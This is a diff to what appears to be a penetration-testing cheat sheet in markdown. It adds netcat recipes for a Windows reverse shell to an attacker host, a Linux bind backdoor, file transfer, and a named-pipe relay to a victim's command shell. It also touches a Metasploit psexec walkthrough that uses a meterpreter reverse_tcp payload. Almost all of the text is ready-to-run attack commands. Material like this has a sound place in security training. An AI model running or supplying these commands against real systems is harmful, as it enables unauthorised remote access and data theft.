@@ -20,7 +20,7 @@ nc [ip_of_listener] [port]
 nc 10.10.75.75 2222
 ```
 
-Create Backdoor on Linux:
+Create backdoor on Linux:
 
 ```
 nc -l [port] -e /bin/sh
@@ -32,6 +32,56 @@ Connect to the backdoor:
 ```
 nc.exe [ip_of_listener] [port]
 nc.exe 10.10.75.75 7777
+```
+
+Create reverse shell on Windows
+```
+[Attacker] nc -l -p 8888
+[Victim] nc 10.10.10.10 8888 -e cmd.exe
+```
+
+Pulling a file:
+
+```
+[Listener]echo "this is a test" > text.txt
+[Listener]nc -l -p 1234 < text.txt
+
+[Client]nc [Listerner IP] > received.txt
+```
+
+Pushing a file:
+
+```
+[Client]echo "test" > file.txt
+[Listener]nc -l -p 4321 > received.txt
+[Client] nc 10.10.10.1 4321 < file.txt
+[Listener] type receive.txt
+```
+
+Create a Linux relay:
+
+Run listening shell on Windows (victim):
+
+```
+nc -l -p 54321 -e cmd.exe
+```
+
+Create a FIFO named pipe on Linux (attacker):
+
+```
+mknod backpipe p
+```
+
+Create a relay and interact with the named pipe (attacker):
+
+```
+nc -l -p 11111 0<backpipe | nc 10.10.10.1 54321 1>backpipe
+```
+
+Open new terminal on Linux (attacker) and run netcat to connect to the relay:
+
+```
+nc 127.0.0.1 11111
 ```
 
 ### SSH
@@ -68,43 +118,43 @@ Starting Metasploit:
 msfconsole
 ```
 
-Listing Exploits:
+Listing exploits:
 
 ```
 show exploits
 ```
 
-Searching Exploits:
+Searching exploits:
 
 ```
 search type:exploit psexec
 ```
 
-Acquiring Info on an Exploit:
+Acquiring info on an exploit:
 
 ```
 info exploit/windows/smb/psexec
 ```
 
-Selecting an Exploit to Use:
+Selecting an exploit to use:
 
 ```
 use exploit/windows/smb/psexec
 ```
 
-Configuring Exploit Settings:
+Configuring exploit settings:
 
 ```
 set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
-Showing Options:
+Showing options:
 
 ```
 show options
 ```
 
-Configuring Variables:
+Configuring variables:
 
 ```
 set RHOST [Target IP]
@@ -113,19 +163,19 @@ set SMBPass [password]
 set LHOST [source/attacker IP]
 ```
 
-Launching Exploit:
+Launching exploit:
 
 ```
 exploit
 ```
 
-Backgrounding a Session:
+Backgrounding a session:
 
 ```
 background
 ```
 
-Listing Sessions:
+Listing sessions:
 
 ```
 sessions -l
@@ -135,7 +185,7 @@ sessions -l
 sessions -i [session #]
 ```
 
-Popular Meterpreter Commands:
+Popular meterpreter commands:
 
 ```
 ?
